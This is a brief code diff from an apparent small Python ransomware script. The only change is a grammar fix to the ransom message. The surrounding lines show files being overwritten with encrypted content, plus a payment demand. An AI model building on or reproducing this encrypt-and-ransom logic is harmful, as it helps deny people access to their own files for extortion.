@@ -42,7 +42,7 @@ if not os.path.exists(current_key):
             with open(file, 'wb') as the_file:
                 the_file.write(encrypted_content)
 
-        print('Your Files Has Been Encrypted! Pay Me 1 Dollar to Get Files Back!')
+        print('Your Files Have Been Encrypted! Pay Me 1 Dollar to Get Files Back!')
 else:
     print('Your Files Already Encrypted :)')
  
